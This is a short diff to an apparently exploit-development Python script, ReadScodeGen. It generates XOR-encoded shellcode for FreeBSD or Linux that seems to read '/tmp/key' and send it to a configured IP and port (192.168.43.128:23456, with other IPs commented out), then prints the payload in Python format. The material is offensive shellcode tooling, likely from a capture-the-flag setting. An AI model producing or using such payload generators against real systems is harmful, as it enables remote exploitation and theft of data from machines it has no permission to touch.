@@ -150,15 +150,10 @@ class ReadScodeGen():
         
         scodeBinStr = open(self.encFilename, "rb").read()
         sys.stdout.write("[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(scodeBinStr), len(scodeBinStr)))        
-        self.scodeBinStr = scodeBinStr
-        return 
+        return scodeBinStr
 
 if __name__ == "__main__":
-    #gen = ReadScodeGen( "/tmp/key", 0x10, "127.0.0.1", 23456, platform="linux")
-    #gen = ReadScodeGen( "/tmp/key", 0x30, "141.223.83.189", 23456, platform="freebsd")
-    gen = ReadScodeGen( "/tmp/key", 0x4, "192.168.43.128", 23456, xorKey=0x88, platform="freebsd")
-
-    #gen.encode()
+    gen = ReadScodeGen( "/tmp/key", 0x4, "192.168.43.128", 23456, xorKey=0x88, platform="freebsd", encodeFlag=True)
     gen.getBinScode()
     print gen.getPythonFormatScode()
     #print gen.getCppFormatScode()    
